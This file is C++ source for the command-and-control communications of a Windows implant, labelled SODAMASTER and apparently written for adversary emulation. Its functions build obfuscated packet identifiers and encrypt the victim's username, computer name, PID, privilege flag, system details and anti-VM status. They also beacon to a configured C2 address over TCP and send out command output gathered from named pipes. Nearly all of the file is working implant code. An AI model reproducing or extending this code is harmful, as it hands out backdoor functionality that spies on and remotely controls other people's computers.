#include "Comslib.h"

//  GeneratePacketIdentifier()
//      About:
//         This function contains a stackstring packet identifier. The packet identifier will be used to differentiate from junk TCP connections and actual
//          implant traffic.
//          After the session id is set, the stackstring will be replaced with the session id.
//      Result:
//          [std::string] returns the packet identifier as a string for use in packet data
std::string GeneratePacketIdentifier() {
    char pHead[] = "AwDyMGSeXR";
    // SODAMASTER
    *pHead = RetCharVal(22, 66);
    *(pHead + 1) = RetCharVal(69, 15);
    *(pHead + 3) = RetCharVal(51, 19);
    *(pHead + 5) = 65;
    *(pHead + 7) = RetCharVal(14, 75);
    *(pHead + 8) = 69;
    return retHex(pHead);
}

//  FormatPacketData(int id, std::string data)
//      About:
//         Takes data and a correlated id value then adds the data size to format a chunk of packet data.
//         [ID] [SIZE] [DATA CHUNK]
//      Result:
//          [std::string] returns the formatted data chunk
std::string FormatPacketData(int id, std::string data) {
    std::string datalen;
    std::string fData = "";
    fData += decimalToHex(id);
    

    // if the data variable (string) is blank then we just want to send. Add the id and return.
    if (data != "") {
        datalen = intToHexBytes(data.length());                     // Data Length -> 120 = 010200
        fData += decimalToHex(datalen.length() / 2);                // Length of Length
        fData += datalen;                                           // Length
        fData += retHex(data);


        
    }
    if (DEBUG_MSG)
        writeToFile(XorStr("Packet Formatter: ") + fData);
    return fData;
}

//  GenerateFirstPacket(std::string *fDateTime, CryptoPP::SecByteBlock* rc4Key)
//      About:
//         Formats all of the required information to create a C2 session with the handler and puts it into the "first packet".
//      Result:
//          [std::vector<char>] returns the properly formatted packet data
std::vector<char> GenerateFirstPacket(std::string *fDateTime, CryptoPP::SecByteBlock* rc4Key) {
    // create a string version of RC4 key for the first packet
    std::string rc4KeyString = RC4KeyToString(*rc4Key);

    std::string Packet = GeneratePacketIdentifier();                                  // packet identifier
    Packet += FormatPacketData(3, GetCurrentUserName());                              // Username
    Packet += FormatPacketData(6, rc4KeyString);                                      // RC4 Encryption Key
    Packet += FormatPacketData(7, GetCurrentComputerName());                          // Computer Name       
    
    std::vector<char> encryptedPacket = RSAEncrypt(Packet);                           // RSA encrypt


    if (DEBUG_MSG)
        writeToFile(XorStr("First Packet: ") + Packet);
    return encryptedPacket;
}

//  GenerateReconPacket(std::string* session_id, std::string *fDateTime, CryptoPP::SecByteBlock* rc4Key)
//      About:
//         Brings together all the information gathering functions to build out the "recon packet" sent to the c2 server.
//      Result:
//          [std::vector<char>] returns the properly formatted packet data
std::vector<char> GenerateReconPacket(std::string* session_id, std::string* fDateTime, CryptoPP::SecByteBlock* rc4Key) {
    std::string b64EncodedData;
    std::string Packet = *session_id;                                                 // packet identifier
    Packet += FormatPacketData(4, GetPID());                                          // PID
    Packet += FormatPacketData(5, *fDateTime);                                        // Start Date/Time       
    Packet += FormatPacketData(9, IsDebugPrivilege(0));                                // Priv Flag (SE_DEBUG)
    Packet += FormatPacketData(40, GetSMSysInfo());                                   // System & Build Information

    // Socket Name
    // Junk data here
    std::string encryptedPacket = RC4EncryptString(Packet, *rc4Key);                  // RC4 encrypt
    std::vector<char> pkt(encryptedPacket.begin(), encryptedPacket.end()); // Temp until we turn on RC4 encryption
    std::string encPkt(pkt.begin(), pkt.end());

    if (DEBUG_MSG)
        writeToFile(XorStr("Recon Packet: ") + encPkt);
    return pkt;
    //return encryptedPacket;
}

//  GenerateBeacon(std::string *session_id)
//      About:
//         Creates the beacon packet that will be sent to C2
//      Result:
//          [std::vector<char>] returns the properly formatted packet data
std::vector<char> GenerateBeacon(std::string* session_id, CryptoPP::SecByteBlock* rc4Key) {
    std::string Packet = *session_id;                               // packet identifier
    Packet += FormatPacketData(98, "");                             // Beacon
    // Junk data here
    std::string encryptedPacket = RC4EncryptString(Packet, *rc4Key);                  // RC4 encrypt
    std::vector<char> pkt(encryptedPacket.begin(), encryptedPacket.end()); // Temp until we turn on RC4 encryption

    if (DEBUG_MSG)
        writeToFile(XorStr("Beacon Packet: ") + Packet);
    return pkt;
}

//   GenerateOutputPacket(std::string* session_id, std::string data)
//      About:
//         Creates a packet that contains STDOUT data from named pipes or another source.
//      Result:
//          [std::vector<char>] returns the properly formatted packet data
std::vector<char> GenerateOutputPacket(std::string* session_id, std::string data, CryptoPP::SecByteBlock* rc4Key) {
    std::string Packet = *session_id;                               // packet identifier
    Packet += FormatPacketData(99, data);                           // STDOUT, Data, Etc.
    // Junk data here
    std::string encryptedPacket = RC4EncryptString(Packet, *rc4Key);                  // RC4 encrypt
    std::vector<char> pkt(encryptedPacket.begin(), encryptedPacket.end()); // Temp until we turn on RC4 encryption

    if (DEBUG_MSG)
        writeToFile(XorStr("STDOUT Data Packet: ") + Packet);
    return pkt;
}

//  HandleC2Comms(bool *first_packet, std::string *fDateTime, int *sleep_time, std::string *session_id, CryptoPP::SecByteBlock* rc4Key)
//      About:
//         Takes 4 arguments to determine if the first packet has already been sent. If it has, it checks to see if there are
//          any named pipes that contain STDOUT data. If there are then the data is sent to c2, otherwise a beacon packet is created and sent to C2
//      Result:
//          [int] The result of the TCP send data (error/success code)
int HandleC2Comms(bool *first_packet, std::string *fDateTime, int *sleep_time, std::string *session_id, CryptoPP::SecByteBlock* rc4Key, std::string antiVMStatus) {
    if (!*first_packet) {
        int res = SendData(GenerateFirstPacket(fDateTime, rc4Key), sleep_time, session_id, rc4Key);
        if (res != 10061) {
            SendData(GenerateReconPacket(session_id, fDateTime, rc4Key), sleep_time, session_id, rc4Key);
            std::string b64EncodedData;
            b64EncodedData = base64_encode_string(antiVMStatus);
            int res = SendData(GenerateOutputPacket(session_id, b64EncodedData, rc4Key), sleep_time, session_id, rc4Key);
            *first_packet = true;
        }
        return res;
    }
    else {
        // check if there is any data in named pipes to return, otherwise just send a beacon.
        std::vector<std::string> pipes = FindPipeWithPrefix();
        if (pipes.size() > 0) {
            std::string pipeData = IterNamedPipes(pipes);
            if (pipeData.length() > 0) {
                // send data back to c2
                int res = SendData(GenerateOutputPacket(session_id, pipeData, rc4Key), sleep_time, session_id, rc4Key);
                return res;
            }
            
        }
        // send beacon
        int res = SendData(GenerateBeacon(session_id, rc4Key), sleep_time, session_id, rc4Key);
        return res;
    }
}


//  SendData(std::vector<char> pData, int *sleep_time)
//      About:
//         Takes data that should be sent to the C2 server, opens a TCP connection based on the stored C2 information,
//           sends the data to C2, then collects a response from C2.
//      Result:
//          Passes C2 response to HandleC2Response(); Returns an int value (error/success code)
int SendData(std::vector<char> pData, int *sleep_time, std::string *session_id, CryptoPP::SecByteBlock* rc4Key) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;

    const char* sendbuf = pData.data();
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        if (DEBUG_MSG)
            writeToFile(XorStr("WSAStartup failed with error: ") + iResult,"error");
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(C2_IP_ADDRESS, C2_PORT, &hints, &result);
    if (iResult != 0) {
        if (DEBUG_MSG)
            writeToFile(XorStr("getaddrinfo failed with error: ") + iResult,"error");
        WSACleanup();
        return 1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            if (DEBUG_MSG)
                writeToFile(XorStr("socket failed with error: ") + std::to_string(WSAGetLastError()), "error");
            continue;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;

    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        if (DEBUG_MSG)
            writeToFile(XorStr("Unable to connect to server!"), "error");
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, pData.size(), 0);
    if (iResult == SOCKET_ERROR) {
        if (DEBUG_MSG)
            writeToFile(XorStr("send failed with error: ") + std::to_string(WSAGetLastError()), "error");
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        if (DEBUG_MSG)
            writeToFile(XorStr("shutdown failed with error: ") + std::to_string(WSAGetLastError()),"error");
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    std::vector<char> dataVec;
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            dataVec.insert(dataVec.end(), recvbuf, recvbuf + iResult);
        }
        else if (iResult == 0) {
            if (DEBUG_MSG)
                writeToFile(XorStr("Connection closed"));
        }
        else {
             if (DEBUG_MSG)
                writeToFile(XorStr("recv failed with error: ") + std::to_string(WSAGetLastError()),"error");
        }

    } while (iResult > 0);

    std::string s(dataVec.begin(), dataVec.end());

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
    
    HandleC2Response(s, sleep_time, session_id, rc4Key);

    return 0;
}

